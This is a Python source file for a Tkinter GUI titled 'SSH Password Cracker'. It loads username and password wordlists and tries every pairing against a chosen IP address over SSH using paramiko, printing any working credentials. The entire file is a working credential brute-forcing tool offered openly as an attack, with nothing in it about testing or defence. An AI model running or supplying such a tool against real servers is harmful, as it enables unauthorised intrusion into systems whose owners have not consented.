import tkinter as tk
import paramiko
import itertools
import threading
from tkinter import filedialog

class SSHCracker:
    def __init__(self, master):
        self.master = master
        self.master.title("SSH Password Cracker")

        tk.Label(master, text="IP Address:").pack()
        self.ip_var = tk.StringVar()
        tk.Entry(master, textvariable=self.ip_var, width=30).pack()

        tk.Label(master, text="Username wordlist:").pack()
        self.username_listbox = tk.Listbox(master, width=50, height=10)
        self.username_listbox.pack()

        tk.Label(master, text="Password wordlist:").pack()
        self.password_listbox = tk.Listbox(master, width=50, height=10)
        self.password_listbox.pack()

        tk.Button(master, text="Load username wordlist", command=self.load_username_wordlist).pack()
        tk.Button(master, text="Load password wordlist", command=self.load_password_wordlist).pack()

        tk.Button(master, text="Crack", command=self.crack).pack()

      

    def load_username_wordlist(self):
        file_path = filedialog.askopenfilename(filetypes=[("Text files", "*.txt")])
        if file_path:
            with open(file_path, "r") as f:
                self.username_listbox.delete(0, tk.END)
                for line in f:
                    self.username_listbox.insert(tk.END, line.strip())

    def load_password_wordlist(self):
        file_path = filedialog.askopenfilename(filetypes=[("Text files", "*.txt")])
        if file_path:
            with open(file_path, "r") as f:
                self.password_listbox.delete(0, tk.END)
                for line in f:
                    self.password_listbox.insert(tk.END, line.strip())

    def crack(self):
        ip = self.ip_var.get()
        usernames = [u.strip() for u in self.username_listbox.get(0, tk.END)]
        passwords = [p.strip() for p in self.password_listbox.get(0, tk.END)]

        def crack_credentials():
            for username in usernames:
                for password in passwords:
                    try:
                        ssh = paramiko.SSHClient()
                        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                        ssh.connect(ip, username=username, password=password)
                        print(f"[+] Password found: {password} for user {username}")
                        ssh.close()
                    except:
                        pass

        threading.Thread(target=crack_credentials).start()


root = tk.Tk()
app = SSHCracker(root)
root.mainloop()